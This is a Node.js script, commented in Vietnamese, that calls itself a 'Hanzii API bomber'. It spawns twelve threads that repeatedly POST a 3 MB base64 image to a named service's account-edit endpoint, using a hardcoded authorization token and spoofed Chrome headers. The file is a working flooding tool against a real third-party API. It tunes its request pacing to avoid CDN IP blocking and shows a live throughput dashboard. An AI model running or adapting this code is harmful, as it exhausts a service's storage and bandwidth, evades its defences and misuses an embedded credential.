const { Worker, isMainThread, workerData, parentPort } = require('worker_threads');
const crypto = require('crypto');
const fs = require('fs');

const TARGET_CONFIG = {
    url: "https://api.hanzii.net/api/account/edit",
    authorization: "77604176298906393361302463310390",
    // Số luồng (Thread)
    threadCount: 12, 
    // File ảnh gốc để chuyển sang Base64
    localImagePath: "Tớ là hacker nek_3mb.png"
};

if (isMainThread) {
    if (!fs.existsSync(TARGET_CONFIG.localImagePath)) {
        console.error(`❌ Không tìm thấy file ${TARGET_CONFIG.localImagePath}!`);
        process.exit(1);
    }

    let stats = { count: 0, mb: 0 };
    let startTime = Date.now();
    let logs = new Array(TARGET_CONFIG.threadCount).fill("Initializing...");

    for (let i = 0; i < TARGET_CONFIG.threadCount; i++) {
        const worker = new Worker(__filename, { workerData: i });
        worker.on('message', (msg) => {
            if (msg.type === 'success') {
                stats.count++;
                stats.mb += msg.sizeMB;
            }
            logs[i] = msg.status;
        });
    }

    setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        process.stdout.write('\x1Bc'); // Clear console
        console.log(`================================================================`);
        console.log(`🚀 HANZII API BOMBER - BASE64 JSON MODE`);
        console.log(`================================================================`);
        console.log(`⏱️  Uptime: ${elapsed.toFixed(0)}s | 🚀 Total: ${stats.mb.toFixed(2)} MB`);
        console.log(`📦 Requests Sent: ${stats.count} | ⚡ Speed: ${(stats.mb / elapsed).toFixed(2)} MB/s`);
        console.log(`----------------------------------------------------------------`);
        logs.forEach((l, idx) => console.log(` [Thread ${idx}] ${l}`));
        console.log(`----------------------------------------------------------------`);
        const lastSuccess = [...logs].reverse().find(l => l.includes('✅'));
        if (lastSuccess) {
            console.log(`👉 ${lastSuccess}`);
        }
        console.log(`================================================================`);
    }, 500);

} else {
    const bomb = async () => {
        // Đọc ảnh và chuyển sang Base64 một lần duy nhất để tiết kiệm CPU
        const imageBuffer = fs.readFileSync(TARGET_CONFIG.localImagePath);
        const base64Data = imageBuffer.toString('base64');
        const sizeMB = (base64Data.length) / (1024 * 1024);
        
        // Header giả lập trình duyệt y chang curl
        const headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en,vi;q=0.9",
            "authorization": TARGET_CONFIG.authorization,
            "content-type": "application/json",
            "origin": "https://hanzii.net",
            "referer": "https://hanzii.net/",
            "sec-ch-ua": '"Chromium";v="146", "Google Chrome";v="146"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
        };

        while (true) {
            try {
                // Tạo Payload JSON với chuỗi Base64
                // Lưu ý: Tên file trong base64 nên thay đổi một chút để tránh cache
                const payload = JSON.stringify({
                    image: `data:image/png;base64,${base64Data}`,
                    token: TARGET_CONFIG.authorization,
                    option: "base64"
                });

                const response = await fetch(TARGET_CONFIG.url, {
                    method: "POST",
                    headers: headers,
                    body: payload
                });

                const result = await response.json();

                if (response.status === 200 && result.status === 200) {
                    parentPort.postMessage({ 
                        type: 'success', 
                        sizeMB, 
                        status: `✅ OK - Link: ${result.link.slice(-30)}` 
                    });
                } else {
                    parentPort.postMessage({ 
                        type: 'res', 
                        status: `❌ Lỗi ${response.status}: ${JSON.stringify(result).slice(0, 20)}` 
                    });
                    // Nếu lỗi Token hoặc bị Rate Limit thì tạm dừng
                    if (response.status === 401 || response.status === 429) break;
                }
            } catch (e) {
                parentPort.postMessage({ type: 'res', status: `💀 Network Error/Timeout` });
            }
            
            // Nghỉ 300ms để tránh bị hệ thống CDN chặn IP quá sớm
            await new Promise(r => setTimeout(r, 300));
        }
    };
    bomb();
}